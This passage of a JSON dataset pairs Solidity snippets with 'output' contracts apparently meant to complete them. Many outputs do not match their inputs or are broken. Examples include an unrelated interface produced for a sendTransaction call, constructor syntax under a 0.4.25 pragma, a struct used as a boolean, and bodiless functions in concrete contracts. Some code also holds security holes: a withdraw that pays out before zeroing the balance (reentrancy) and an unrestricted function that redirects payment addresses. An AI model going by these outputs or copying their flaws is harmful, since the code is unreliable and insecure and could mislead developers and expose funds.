        "input": "function getContractOwner() public view returns (address)\n  {\n    return owner;\n  }\n\ncontract(\"MyContract\", accounts => {\n     let _contract = null\n     let currentOwner=null\n\n    before(async () => {\n      _contract = await MyContract.deployed();\n      currentOwner = await _contract.getContractOwner()          \n    })    \n    it(\"should deploy the contract and allow the user\", async () => {\n        const account = accounts[0];\n        await contract.allowUser(account, {from: currentOwner});\n        const allowedUser = _contract.allowedUser.call(0);\n        assert.equal(whitelistedUser, account, 'new user is not allowed');\n    })\n});\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address private owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner {\n        require(owner == msg.sender);\n        _;\n    }\n\n    function getContractOwner() public view returns (address) {\n        return owner;\n    }\n}\n\n"
    },
    "831.sol": {
        "input": "eth.sendTransaction({from:'0x123456', to:'0x123456', value: '0x8AC4270ACC4B7FF7', gas: '0x5208', gasPrice: '0x4A817C800'});\"\n\n\n",
        "output": "pragma solidity ^0.5.16;\ncontract ETH_Transfer_Example {\n    function transferEther(\n        address payable fromAddress,\n        address payable toAddress,\n        string memory value\n    ) public returns (bool);\n}\n\n"
    },
    "832.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract Test {\n    mapping(uint => string[]) mString;\n    \n    function fillMapping(uint key, string[] memory values) public {\n        mString[key] = values;\n    }\n\n    function getValueFromMapping(uint key) public view returns(string[] memory) {\n        return mString[key];\n    }\n    \n    function useMappingInOtherFunction(uint key) public {\n        string[] memory stringValues = getValueFromMapping(key);\n    }\n    \n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8;\n\ncontract Test {\n    mapping(uint => string[]) mString;\n    \n    // Adding elements inside mapping\n    function fillMapping(uint key, string[] memory values) public {\n        mString[key] = values;\n    }\n\n    // Getter method for retrieve values from mapping, querying for a specific key \n    function getValueFromMapping(uint key) public view returns(string[] memory) {\n        return mString[key];\n    }\n    \n    // Using mapping values in other function\n    function useMappingInOtherFunction(uint key) public {\n        string[] memory stringValues = getValueFromMapping(key);\n        // your logic\n        // ...\n        //\n    }\n    \n}\n\n"
    },
    "834.sol": {
        "input": "function withdraw(uint256 _id) public {\n  Campaign storage campaign = campaigns[_id];\n\n  (bool success, ) = payable(campaign.owner).call{value: campaign.amountCollected}(\"\");\n  require(success, \"Withdrawal failure\");\n  campaign.amountCollected = 0;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ERC666 {\n    function withdraw(uint256 _id) public payable {\n    }\n}\n\n"
    },
    "835.sol": {
        "input": "returns (uint[] memory amounts)\n\namounts = UniswapV2Library.getAmountsOut(factory, msg.value, path);\n\nfunction foo() external pure returns (uint256 number) {\n    number = 100;\n}\n\nfunction foo() external pure returns (uint256) {\n    uint256 number = 100;\n    return number;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary UniswapV2Library {\n    function getAmountsOut(address factory, uint256 value, address[] memory path) external pure returns (uint256[] memory amounts) {\n        // implementation of getAmountsOut function\n    }\n}\n\ncontract MyContract {\n    function foo() external pure returns (uint256) {\n        uint256 number = 100;\n        return number;\n    }\n}\n"
    },
    "836.sol": {
        "input": "function _transfer(address sender, address recipient, uint256 amount) private {\n    require(sender != address(0), \"BEP20: transfer from the zero address\");\n    require(balanceOf(sender) >= amount, \"BEP2': not enough balance\");\n    \n    uint256 tokensToBurn = amount.mul(burningFee).div(100);\n    amount = amount.sub(tokensToBurn);\n\n    balances[sender] = balances[sender].sub(amount);\n\n    _burn(sender, tokensToBurn);\n    balances[recipient] = balances[recipient].add(amount);\n    \n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary SafeMath {\n    \n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        assert(c / a == b);\n        return c;\n    }\n\n    \n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a / b;\n    }\n    \n    \n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a % b;\n    }\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    \n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    \n    function allowance(address owner, address spender) external view returns (uint256);\n    \n    function transferFrom(address owner, address recipient, uint256 amount) external returns (bool);\n    \n    event Transfer(address indexed from, address indexed to, uint256 value);\n    \n    function approve(address spender, uint256 amount) external returns (bool);\n    \n    function permit() external;\n    \n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n"
    },
    "837.sol": {
        "input": "abstract contract Initializable {\n        bool private _initialized;\n    \n        modifier initializer() {\n            require(!_initialized, \"Initializable: co...\");\n            _;\n            _initialized = true;\n        }\n    }\n    \ncontract UpgradebleTestParent is Initializable {\n    uint public x;\n\n    function initialize(uint _x) internal initializer {\n        x = _x;\n    }\n}\n\ncontract UpgradebleTestMain is UpgradebleTestParent {\n    function init(uint _x) public initializer {\n        initialize(_x);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\nabstract contract Initializable {\n        bool private _initialized;\n    \n        modifier initializer() {\n            require(!_initialized, \"Initializable: co...\");\n            _;\n            _initialized = true;\n        }\n    }\n    \ncontract UpgradebleTestParent is Initializable {\n    uint public x;\n\n    function initialize(uint _x) internal initializer {\n        x = _x;\n    }\n}\n\ncontract UpgradebleTestMain is UpgradebleTestParent {\n    function init(uint _x) public initializer {\n        initialize(_x);\n    }\n}\n\n"
    },
    "838.sol": {
        "input": "pragma solidity >=0.7.0 <0.9.0;\n\n userAddressToStruct[_userAddress] = contractAddress;\n\n userAddressToStruct[_userAddress].contractAddress = contractAddress;\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract UserStructs {\n    \n    mapping (address => UserStruct) userAddressToStruct;\n    \n    struct UserStruct {\n        address contractAddress;\n        string name;\n        string symbol;\n        uint256 decimals;\n    }\n\n    constructor() {\n        address contractAddress = msg.sender;\n        UserStruct userStruct;\n        userStruct.contractAddress = contractAddress;\n        userStruct.name = \"CryptoMoonCoin\";\n        userStruct.symbol = \"CMC\";\n        userStruct.decimals = 2;\n        userAddressToStruct[contractAddress] = userStruct;\n    }\n}\n\n"
    },
    "839.sol": {
        "input": "contract MyContract is Ownable(\"secret value\") {\n\n    address vault;\n\n    constructor(string memory _secret) public {\n        secretvault _Vault = new Vault(_secret);\n        secretvault = address(_Vault);\n        super;\n    }\n    function getsecret() public view addcontract returns(string memory){\n        secretvault _Vault = Vault(secretvault);\n        return _Vault.getsecret();\n    }\n}\n\ncontract MyContract is Ownable {\n\n    address vault;\n\n    constructor(string memory _secret) Ownable(\"secret value\") public {\n        secretvault _Vault = new Vault(_secret);\n        secretvault = address(_Vault);\n        super;\n    }\n    function getsecret() public view addcontract returns(string memory){\n        secretvault _Vault = Vault(secretvault);\n        return _Vault.getsecret();\n    }\n}\n\n\npragma solidity ^0.6.0;\n\ncontract Ownable {\n\n   address public owner;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(owner == msg.sender, \"Only owner can accesss\");\n        _;\n    }\n}\n\ncontract Vault {\n    string private secret;\n\n    constructor(string memory _secret) public {\n        secret = _secret;\n    }\n\n    function getSecret() public view returns(string memory){\n        return secret;\n    }\n}\n\ncontract MyContract is Ownable {\n\n    Vault vault;\n\n    constructor(string memory _secret) public {\n        vault = new Vault(_secret);\n    }\n    function getSecret() public view onlyOwner returns(string memory){\n        return vault.getSecret();\n    }\n}\n\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Ownable {\n\n   address public owner;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(owner == msg.sender, \"Only owner can accesss\");\n        _;\n    }\n}\n\ncontract Vault {\n    string private secret;\n\n    constructor(string memory _secret) public {\n        secret = _secret;\n    }\n\n    function getSecret() public view returns(string memory){\n        return secret;\n    }\n}\n\n"
    },
    "841.sol": {
        "input": "constructor(address _priceSource, address _quote, uint8 _decimals) public {\n        priceSource = AggregatorV3Interface(_priceSource);\n        quote  = ERC20(_quote);\n        decimals = uint8 (_decimals);\n        \n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface AggregatorV3Interface {\n function latestAnswer(address aggregator) external view returns (uint256);\n }\n\n"
    },
    "842.sol": {
        "input": "abstract contract ERC721Burnable is Context, ERC721 {}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface Context {\n  \n  function _messageReceived(\n    address from,\n    uint256 code\n  ) external;\n\n}\n\n"
    },
    "843.sol": {
        "input": "pragma solidity 0.8.12;\n\ncontract StringConcatation {\n    function AppendString(string memory a, string memory b) public pure returns (string memory) {\n        return string.concat(a,\"-\",b);\n    }\n}\n\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract StringConcatenation {\n    function AppendString(string memory a, string memory b) public pure returns (string memory) {\n        return string(abi.encodePacked(a, \"-\", b));\n    }\n}\n\n"
    },
    "844.sol": {
        "input": "function purchaseCard(uint _id) public {\n   User storage user = users[msg.sender];\n   if (!checkExistedUser(msg.sender)) {\n     user.exist = true;\n     user.numberOfCards = 0;\n   }\n   user.purchase.push(Purchase(cards[_id], block.timestamp));\n   user.numberOfCards++;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\n    contract PurchasedCard {\n\n      struct Purchase {\n        address cardAddress;\n        uint256 timestamp;\n      }\n\n      struct User {\n        bool exist;\n        uint256 numberOfCards;\n        address owner;\n        address operator;\n        bool admin;\n        uint256 lastAccess;\n        Purchase[] purchase;\n      }\n\n      mapping(address => User) public users;\n\n      mapping(uint256 => address)\n      public\n      cards;\n\n\n      function checkExistedUser(address user) public view returns (bool) {\n        User storage user = users[msg.sender];\n        return user.exist;\n      }\n\n\n      function purchaseCard(uint _id) public {\n        User storage user = users[msg.sender];\n        if (!checkExistedUser(msg.sender)) {\n           user.exist = true;\n           user.numberOfCards = 0;\n        }\n        user.purchase.push(Purchase(cards[_id], block.timestamp));\n        user.numberOfCards++;\n      }\n\n\n   fallback() external {\n     revert(\"Fallback function\");\n   }\n  }\n\n"
    },
    "846.sol": {
        "input": "library Constants {\n    function MY_CONSTANT() public pure returns (uint256) {\n        return 3;\n    }\n}\n\nuint256 value = Constants.MY_CONSTANT();\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary Constants {\n    function MY_CONSTANT() public pure returns (uint256) {\n        return 3;\n    }\n}\n\ncontract MyContract {\n    \n    \n    \n    uint256 value = Constants.MY_CONSTANT();\n}\n\n"
    },
    "847.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract Elector {\n}\n\ncontract Main {\n    Elector elector;\n\n    function deployElector() external {\n        elector = new Elector();\n    }\n\n    function getInformationFromElector() external view returns (address, Elector.VoteType) {\n        return elector.getInformation();\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.4.19;\ncontract Elector {\n\n    struct Vote {\n        bytes32 hashedQuestion;\n        bytes32 hashedProposal;\n        bool vote;\n        VoteType voteType;\n    }\n\n    struct VoteType {\n        bool yes;\n        bool no;\n    }\n\n    function vote(\n        bytes32 hashedQuestion,\n        bytes32 hashedProposal,\n        bytes32 voteTypeHash,\n        address voterAddress\n    ) external returns (bool);\n\n    function getQuestion(\n    ) external returns (bytes memory question);\n\n    function getProposals(\n        bytes32 questionHash\n    ) external returns (bytes memory proposals);\n\n    function getInformation() external view returns (address, VoteType);\n}\n\n"
    },
    "848.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    uint256 constant MAX_INTERACTIONS = 10;\n    mapping(address => uint256) interactionCount;\n\n    modifier limit {\n        require(interactionCount[msg.sender] < MAX_INTERACTIONS);\n        interactionCount[msg.sender]++;\n        _;\n    }\n\n    function foo() external limit {\n    }\n\n    function resetLimit(address user) external {\n        interactionCount[user] = 0;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    uint256 constant MAX_INTERACTIONS = 10;\n    mapping(address => uint256) interactionCount;\n\n    modifier limit {\n        require(interactionCount[msg.sender] < MAX_INTERACTIONS);\n        interactionCount[msg.sender]++;\n        _;\n    }\n\n    function foo() external limit {\n        // your implementation\n    }\n\n    function resetLimit(address user) external {\n        // TODO you might want to restrict this function only to an authorized address\n        interactionCount[user] = 0;\n    }\n}\n\n"
    },
    "849.sol": {
        "input": "\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Pausable {\n    address public owner;\n    bool public paused = false;\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    modifier restricted() {\n        require(paused == false || msg.sender == owner, \"Token is paused\");\n        _;\n    }\n    \n    function pause() external restricted {\n        paused = true;\n    }\n    \n    function unpause() external restricted {\n        paused = false;\n    }\n}\n\n"
    },
    "850.sol": {
        "input": "tokenContract.transfer(_to, _amount);\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract Token {\nfunction _transfer(address to, uint amount) internal;\n}\n\ncontract ERC20 {\nfunction transfer(address to, uint amount) public;\n}\n\ncontract ERC20Burnable {\nfunction burn(uint amount) public;\n}\n\ncontract EtherFallback {\nfunction() internal payable {}\n}\n\ncontract EtherDaoFallback {\nfunction() internal payable {\n\tERC20Burnable(msg.sender).burn(msg.value);\t\n}\n}\n\n"
    },
    "852.sol": {
        "input": "pragma solidity ^0.8.4;\n\ncontract TestContract {\n\n  struct Item {\n    uint itemId;\n    uint itemValue;\n  }\n\n  struct OverlayingItemStruct {\n    mapping(uint => Item) items;\n    uint overlayingId;\n    uint itemsCount;\n  }\n\n  mapping(uint => OverlayingItemStruct) public overlayingItems;\n  \n  uint public overlayCount;\n\n  function addOverlayingItemsStruct(uint _value) external {\n    overlayCount ++;\n    Item memory item = Item(1, _value);\n    overlayingItems[overlayCount].items[1] = item;\n  }\n\n  function addItem(uint _value, uint _overlayId) external {\n    OverlayingItemStruct storage overlay = overlayingItems[_overlayId];\n    overlay.itemsCount ++;\n    overlay.items[overlay.itemsCount] = Item(overlay.itemsCount, _value);\n  }\n}  \n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\ncontract TestContract {\n\n  struct Item {\n    uint itemId;\n    uint itemValue;\n  }\n\n  struct OverlayingItemStruct {\n    mapping(uint => Item) items;\n    uint overlayingId;\n    uint itemsCount;\n  }\n\n  mapping(uint => OverlayingItemStruct) public overlayingItems;\n  \n  uint public overlayCount;\n\n  function addOverlayingItemsStruct(uint _value) external {\n    overlayCount ++;\n    // NOTE: I declared a new Item struct\n    Item memory item = Item(1, _value);\n    // NOTE: I set into items mapping key value 1, Item struct created in row above this \n    overlayingItems[overlayCount].items[1] = item;\n  }\n\n  function addItem(uint _value, uint _overlayId) external {\n    OverlayingItemStruct storage overlay = overlayingItems[_overlayId];\n    overlay.itemsCount ++;\n    overlay.items[overlay.itemsCount] = Item(overlay.itemsCount, _value);\n  }\n}  \n\n"
    },
    "853.sol": {
        "input": "require(msg.sender.balance > 0 ether,\"You  Broke\");\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract SafeTransfer {\n\n    function transferEther(address recipient, uint amount) public {\n        require(msg.sender.balance > 0 ether,\"You  Broke\");\n        recipient.transfer(amount);\n    }\n}\n\n"
    },
    "854.sol": {
        "input": "function isContract(address addressValue) public view returns (bool) {\n    uint size;\n    assembly { size := extcodesize(addressValue) }\n    return size > 0;\n}\n\n'\n\n pragma solidity 0.8.7;\n\n contract ContractIdentifier{\n\n      function isContract(address addressValue) public view returns (bool) {\n          uint size;\n          assembly { size := extcodesize(addressValue) }\n          return size > 0;\n      }\n }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ContractIdentifier {\n\n  \n  function isContract(address addressValue) public view returns (bool) {\n       uint size;\n       assembly { size := extcodesize(addressValue) }\n       return size > 0;\n    }\n }\n\n"
    },
    "855.sol": {
        "input": "pragma solidity ^0.8.17;\n\ncontract Blockbook{\n    address payable public address1;\n    address payable public address2;\n    address payable public address3;\n\n    constructor(address payable _address1, address payable _address2, address payable _address3) public {\n        address1 = _address1;\n        address2 = _address2;\n        address3 = _address3;\n    }\n\n    function splitPayment(uint amount) public payable {\n        address1.transfer(amount * 0.8);\n        address2.transfer(amount * 0.1);\n        address3.transfer(amount * 0.1);\n    }\n\n    receive() external payable {\n        splitPayment(msg.value);\n    }\n\n    function updateAddresses(address payable _address1, address payable _address2, address payable _address3) public {\n        address1 = _address1;\n        address2 = _address2;\n        address3 = _address3;\n}\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Blockbook {\n    address payable public address1;\n    address payable public address2;\n    address payable public address3;\n\n    constructor(address payable _address1, address payable _address2, address payable _address3) {\n        address1 = _address1;\n        address2 = _address2;\n        address3 = _address3;\n    }\n\n    function splitPayment(uint amount) public payable {\n        address1.transfer(amount * 80 / 100);\n        address2.transfer(amount * 10 / 100);\n        address3.transfer(amount * 10 / 100);\n    }\n\n    receive() external payable {\n        splitPayment(msg.value);\n    }\n\n    function updateAddresses(address payable _address1, address payable _address2, address payable _address3) public {\n        address1 = _address1;\n        address2 = _address2;\n        address3 = _address3;\n    }\n}\n"
    },
    "856.sol": {
        "input": "pragma solidity 0.8.21;\n\ncontract MyContract {\n    function foo(string calldata someInput) external {\n        someInput = \"hello\";\n    }\n\n    function foo2(string memory someInput) external pure {\n        someInput = \"hello\";\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    string public someInput;\n\n    function foo(string calldata _someInput) external {\n        someInput = _someInput;\n    }\n\n    function foo2(string memory _someInput) external pure returns (string memory) {\n        return _someInput;\n    }\n}\n"
    },
    "857.sol": {
        "input": "pragma solidity ^0.8.0;\n\nimport \"./ContractB.sol\";\n\ncontract Counter is KeeperCompatibleInterface {\n    ContractB public contractB;\n    uint256 public counter;\n\n    constructor(ContractB _contractBAddress) {\n        contractB = _contractBAddress;\n    }\n\n    function performUpkeep(bytes calldata) external override {\n        counter = counter + 1;\n        contractB.setTokenName(counter);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface KeeperCompatibleInterface {\n    function setTokenName(uint256 tokenId, string calldata tokenName) external;\n}\n\n"
    },
    "858.sol": {
        "input": "function triggerNFTWithdrawalToAddress(\n    address nftContractAddress,\n    uint256 tokenId,\n    address toAddress \n) public {\n    IERC721(nftContractAddress).safeTransferFrom(\n        address(this),\n        toAddress,\n        tokenId,\n        \"0x\"\n    );\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract NFTTrigger {\n    function triggerNFTWithdrawalToAddress(\n        address nftContractAddress,\n        uint256 tokenId,\n        address toAddress \n    ) public;\n}\n\n"
    },
    "860.sol": {
        "input": "pragma solidity ^0.8.8.0;\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary SafeMath {\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a + b;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a - b;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a * b;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a / b;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a % b;\n    }\n}\n\n"
    },
    "861.sol": {
        "input": "pragma solidity ^0.8.7;\n\nimport \"@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol\";\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ResponseAggregator {\n    function price(address asset) external view returns (uint256 priceUSD);\n}\n\n"
    },
    "862.sol": {
        "input": "interface IExchangeRate {\n    function tinycentsToTinybars(uint256 tinycents) external returns (uint256);\n    function tinybarsToTinycents(uint256 tinybars) external returns (uint256);\n}\n\npragma solidity ^0.8.18;\n\ninterface IExchangeRate {\n    function tinycentsToTinybars(uint256 tinycents) external returns (uint256);\n\n    function tinybarsToTinycents(uint256 tinybars) external returns (uint256);\n}\n\ncontract Exchange {\n    IExchangeRate constant ExchangeRate =\n        IExchangeRate(address(0x168));\n\n    event ConversionResult(uint256 inAmount, uint256 outAmount);\n\n    function convert(uint256 usdCents) external returns (uint256 hbarCents) {\n        hbarCents = ExchangeRate.tinycentsToTinybars(usdCents * 100_000_000) / 1_000_000;\n        emit ConversionResult(usdCents, hbarCents);\n    }\n}\n\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IExchangeRate {\n\n    function tinycentsToTinybars(uint256 tinycents) external returns (uint256);\n\n    function tinybarsToTinycents(uint256 tinybars) external returns (uint256);\n}\n\ncontract Exchange {\n    IExchangeRate constant ExchangeRate =\n        IExchangeRate(address(0x168));\n\n    event ConversionResult(uint256 inAmount, uint256 outAmount);\n\n    function convert(uint256 usdCents) external returns (uint256 hbarCents) {\n        hbarCents = ExchangeRate.tinycentsToTinybars(usdCents * 100_000_000) / 1_000_000;\n        emit ConversionResult(usdCents, hbarCents);\n    }\n}\n\n"
    },
    "864.sol": {
        "input": "pragma solidity 0.8.13;\n    \ncontract Array {\n    string[] public myArray;\n\n    function fillArrayMemory(string memory _word) public {\n        myArray.push(_word);\n    }\n    \n}\n\npragma solidity 0.8.13;\n    \ncontract Array {\n\n    function fillArrayMemory() public {\n        string[] memory _array = new string[](2);\n        _array[0] = \"test\";\n        _array[1] = \"test1\";\n    }\n    \n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract FillArray {\n\n    string[] public myArray;\n\n    function fillArrayMemory(string memory _word) public {\n        myArray.push(_word);\n    }\n\n    function fillArray() public {\n        string[] memory _array = new string[](2);\n        _array[0] = \"test\";\n        _array[1] = \"test1\";\n    }\n}\n\n"
    },
    "866.sol": {
        "input": "address payable private owner;\n\nconstructor(){\n        owner = payable(msg.sender);\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Owned {\n    address payable private owner;\n\n    \n    constructor() {\n        owner = payable(msg.sender);\n    }\n    \n    modifier onlyOwner() {\n        require(\n            owner == msg.sender,\n            ' Owned: Caller is not the owner'\n        );\n        _;\n    }\n    \n    function transferOwnership(address new_owner) public onlyOwner {\n        require(new_owner != address(0), ' Owned: new owner is the zero address');\n        owner = payable(new_owner);\n    }\n}\n\n"
    },
    "867.sol": {
        "input": "payable(admin).transfer(balance[msg.sender]);\n\n  function depositMoneyToAdmin() payable public {\n        (bool success,) = admin.call{value: msg.value}(\"\");\n        balance[admin]+=msg.value;\n         require(success,\"Transfer failed!\");\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n\ncontract Admin {\n  address public admin;\n  mapping (address => uint) public balance;\n\n  constructor()  {\n    admin = msg.sender;\n    balance[admin] = 0;\n\n}\n\n  function depositMoneyToAdmin() payable public {\n        (bool success,) = admin.call{value: msg.value}(\"\");\n        balance[admin]+=msg.value;\n         require(success,\"Transfer failed!\");\n    }\n\n}\n\n"
    },
    "868.sol": {
        "input": "\npragma solidity >=0.7.0 <0.9.0;\n\ncontract Storage {\n    struct Stake {\n        uint256 tokenId;\n        uint256 lockPeriod;\n        uint256 startDate;\n        address owner;\n    }\n   \n    mapping(uint256 => Stake) public vault; \n\n    function loadData(uint256 tokenId, uint256 lockPeriod, uint256 startDate, address owner) public {\n        Stake memory newStake = Stake(tokenId, lockPeriod, startDate, owner);\n        vault[tokenId] = newStake;\n    }\n    \n    function getNftInfo(uint256[] calldata tokenIdsInput) public view returns (uint256[] memory tokenIdsReturn,\n        uint256[] memory lockPeriodsReturn,\n        uint256[] memory startDatesReturn,\n        address[] memory ownersReturn){\n      uint256 tokenId;\n      uint256[] memory tokenIds = new uint256[](tokenIdsInput.length);\n      uint256[] memory lockPeriods = new uint256[](tokenIdsInput.length);\n      uint256[] memory startDates = new uint256[](tokenIdsInput.length);\n      address[] memory owners = new address[](tokenIdsInput.length);\n      for (uint i = 0; i < tokenIdsInput.length; i++) {\n          tokenId = tokenIdsInput[i];\n          Stake storage staked = vault[tokenId];\n          tokenIds[i] = staked.tokenId;\n          lockPeriods[i] = staked.lockPeriod;\n          startDates[i] = staked.startDate;\n          owners[i] = staked.owner;\n      }\n\n      return (tokenIds,\n        lockPeriods,\n        startDates,\n        owners);\n  }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: GPL-3.0\n\npragma solidity >=0.7.0 <0.9.0;\n\n/**\n * @title Storage\n * @dev Store & retrieve value in a variable\n * @custom:dev-run-script ./scripts/deploy_with_ethers.ts\n */\ncontract Storage {\n    struct Stake {\n        uint256 tokenId;\n        uint256 lockPeriod;\n        uint256 startDate;\n        address owner;\n    }\n   \n    mapping(uint256 => Stake) public vault; \n\n    function loadData(uint256 tokenId, uint256 lockPeriod, uint256 startDate, address owner) public {\n        Stake memory newStake = Stake(tokenId, lockPeriod, startDate, owner);\n        vault[tokenId] = newStake;\n    }\n    \n    function getNftInfo(uint256[] calldata tokenIdsInput) public view returns (uint256[] memory tokenIdsReturn,\n        uint256[] memory lockPeriodsReturn,\n        uint256[] memory startDatesReturn,\n        address[] memory ownersReturn){\n      uint256 tokenId;\n      uint256[] memory tokenIds = new uint256[](tokenIdsInput.length);\n      uint256[] memory lockPeriods = new uint256[](tokenIdsInput.length);\n      uint256[] memory startDates = new uint256[](tokenIdsInput.length);\n      address[] memory owners = new address[](tokenIdsInput.length);\n      for (uint i = 0; i < tokenIdsInput.length; i++) {\n          tokenId = tokenIdsInput[i];\n          Stake storage staked = vault[tokenId];\n          tokenIds[i] = staked.tokenId;\n          lockPeriods[i] = staked.lockPeriod;\n          startDates[i] = staked.startDate;\n          owners[i] = staked.owner;\n      }\n\n      return (tokenIds,\n        lockPeriods,\n        startDates,\n        owners);\n  }\n}\n\n"
    },
    "869.sol": {
        "input": "\ncontract ClaimWithSignature {\n\n    address public _owner;\n    mapping(address => uint8) _nonces;\n\n    \n    function claim (uint256 amount, uint8 nonce, uint8 v, bytes32 r, bytes32 s) public returns (bool) {\n\n        address user = msg.sender;\n        bytes memory hashStructRaw = abi.encode(\n            user,\n            amount,\n            nonce\n        );\n\n        bytes32 hashStruct = keccak256(hashStructRaw);\n        address signerRecovered = ecrecover(hashStruct, v, r, s);\n        \n        require(signerRecovered == _owner, \"invalid signature\");\n        require(nonce > _nonces[user], \"nonce too low\");\n\n\n        _nonces[user] = nonce;\n        return true;\n    }\n}\n\nimport { $abiUtils } from '@dequanto/utils/$abiUtils';\nimport { $contract } from '@dequanto/utils/$contract';\nimport { $signRaw } from '@dequanto/utils/$signRaw';\n\nexport async function getTxData (userId) {\n\n    let { user, amount, nonce } = loadUserData(userId);\n\n    let encodedParams = $abiUtils.encode([\n        'address',\n        'uint256',\n        'uint8',\n    ], [\n        user.address,\n        amount,\n        nonce\n    ]);\n    \n    let hash = $contract.keccak256(encodedParams);\n    \n    let { v, r, s } = await $signRaw.signEC(hash, owner.key);\n    \n\n    return { user, amount, nonce, v, r, s };\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ClaimWithSignature {\n\n    address public _owner;\n    mapping(address => uint8) _nonces;\n\n    \n    function claim (uint256 amount, uint8 nonce, uint8 v, bytes32 r, bytes32 s) public returns (bool) {\n\n        address user = msg.sender;\n        bytes memory hashStructRaw = abi.encode(\n            user,\n            amount,\n            nonce\n        );\n\n        bytes32 hashStruct = keccak256(hashStructRaw);\n        address signerRecovered = ecrecover(hashStruct, v, r, s);\n        \n        require(signerRecovered == _owner, \"invalid signature\");\n        require(nonce > _nonces[user], \"nonce too low\");\n\n\n        _nonces[user] = nonce;\n        return true;\n    }\n}\n\n"
    },
    "870.sol": {
        "input": "function getUniverseArray(address _address) public view returns (uint64[3] memory) {\n    return myUni[_address].space;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IMyUni {\n    function myUni(address) external view returns (address);\n}\n\ninterface IUniverse {\n    function getUniverseArray(address _address) external view returns (uint64[3] memory);\n}\n\n"
    },
    "871.sol": {
        "input": "pragma solidity 0.5.0;\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n \n \ncontract GToken is ERC20, Ownable {\n     \n    constructor() ERC20() public {\n    _mint(msg.sender, 50 * (10**18));\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract ERC20 {\n    \n    function totalSupply() public view returns (uint256);\n    \n    function balanceOf(address account) public view returns (uint256);\n\n    function transfer(address to, uint256 value) public returns (bool);\n\n    function allowance(address owner, address spender) public view returns (uint256);\n\n    function transferFrom(address from, address to, uint256 value) public returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ncontract Ownable {\n    address public owner;\n    \n    \n    \n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Ownable: call via owner already\");\n        _;\n    }\n\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    function transferOwnership(address newOwner) public onlyOwner {\n        owner = newOwner;\n    }\n\n}\n\n"
    },
    "872.sol": {
        "input": "import { deploy } from './ethers-lib'\n\n(async () => {\n    try {\n        const result = await deploy('Storage', [])\n        console.log(`address: ${result.address}`)\n    } catch (e) {\n        console.log(e.message)\n    }\n  })()\n\n  \n  contract ContractName {}\n\n\n",
        "output": "pragma solidity ^0.8.9;\n  abstract contract Context {\n\n    \n    function _msgSender() internal view virtual returns (address payable sender) {\n      \n      \n      return payable(msg.sender);\n    }\n  \n    function _msgData() internal virtual view returns (bytes memory) {\n      \n      \n      return msg.data;\n    }\n  \n  }\n\n"
    },
    "873.sol": {
